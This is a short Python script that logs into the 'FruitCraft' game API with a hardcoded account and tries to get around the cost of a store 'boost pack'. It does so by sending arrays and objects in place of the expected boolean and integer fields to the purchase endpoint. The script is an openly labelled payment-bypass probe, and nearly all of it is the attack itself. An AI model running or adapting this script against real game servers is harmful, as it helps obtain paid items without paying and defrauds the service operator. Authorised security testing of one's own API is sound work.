import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    print("Testing Boost Pack Cost Bypass...")
    
    # Try buying boost pack 1 with an array for with_nectar
    print("\n[+] Buying Boost Pack 1 (with_nectar = [False])")
    res = c1.post("/store/buyboostpack", {"type": 1, "with_nectar": [False]})
    print("Boost Pack array:", res)
    time.sleep(2)
    
    # Try buying boost pack 1 with an object for with_nectar
    print("\n[+] Buying Boost Pack 1 (with_nectar = {})")
    res2 = c1.post("/store/buyboostpack", {"type": 1, "with_nectar": {}})
    print("Boost Pack obj:", res2)
    time.sleep(2)

    # Try buying with type = array
    print("\n[+] Buying Boost Pack array type")
    res3 = c1.post("/store/buyboostpack", {"type": [1], "with_nectar": False})
    print("Boost Pack type array:", res3)

if __name__ == "__main__":
    main()
